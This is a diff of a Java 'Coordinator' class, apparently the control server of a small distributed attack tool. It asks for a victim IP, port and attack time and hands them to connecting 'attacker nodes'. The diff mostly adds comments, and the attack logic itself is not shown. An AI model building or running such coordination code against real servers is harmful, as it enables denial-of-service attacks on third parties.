@@ -1,22 +1,33 @@
+/*
+  The program needs to be run with the CoordinatingProtocol class.
+  Ask for the desired target server, to carry out an attack on.
+  This application doesnt need to always be on, just when you need to send information
+  to attacker nodes. 
+*/
+
 import java.net.*;
 import java.io.*;
 import java.util.*;
 
-public class coordinator {
+public class Coordinator {
   public static int my_port = 2337;
-  public static String victim_ip = "127.0.0.1";
-  public static int victim_port = 1337;
+  public static String victim_ip = "127.0.0.1"; //default
+  public static int victim_port = 1337; //default
   public static String victim_time = "";
 
+  /*
+    Starts a server that accepts connections from attacker nodes, and will inform them
+    of the attack information.
+  */
   public static Runnable spawnAttackServer(Socket socket) {
     Runnable attackerHandler = new Runnable() {
       public void run() {
+        //lets you know when an attacker client connects to find out target information.
         System.out.println("attack node connected.");
+        //run the protocol.
         try (
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
-            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
         ) {
-            String inputLine;
             String outputLine;
             CoordinatingProtocol coordinating_protocol = new CoordinatingProtocol(victim_ip, victim_port, victim_time);
 
@@ -35,6 +46,7 @@ public class coordinator {
     return attackerHandler;
   }
 
+  /* just startes the server. Makes for cleaner code. */
   public static void startServer() {
     try {
       ServerSocket serverSocket = new ServerSocket(my_port);
@@ -47,6 +59,9 @@ public class coordinator {
      }
   }
 
+  /*
+    gets the inputs from the user, which will than be passed to the protocol class.
+  */
   public static void getInput() {
     Scanner reader = new Scanner(System.in);
     System.out.print("Enter victim IP (default: " + victim_ip + ") : ");
@@ -65,6 +80,9 @@ public class coordinator {
     }
   }
 
+  /*
+    gets the user input. Informs the user what time the attack will occur. starts the server.
+  */
   public static void main(String[] args) throws IOException {
     getInput();
     System.out.println("Starting Server, will attack at: " + victim_time);
